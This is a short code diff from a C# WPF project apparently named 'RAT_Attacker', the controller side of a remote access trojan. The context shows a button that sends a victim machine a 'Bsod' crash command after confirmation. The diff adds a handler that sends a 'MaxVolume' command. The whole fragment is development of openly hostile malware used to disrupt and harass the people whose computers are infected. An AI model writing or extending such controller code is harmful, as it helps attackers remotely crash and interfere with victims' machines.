@@ -149,5 +149,10 @@ namespace RAT_Attacker
                 MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes)
                 SendCommand(RatCommand.Bsod);
         }
+
+        private void Max(object sender, RoutedEventArgs e)
+        {
+            SendCommand(RatCommand.MaxVolume);
+        }
     }
 }
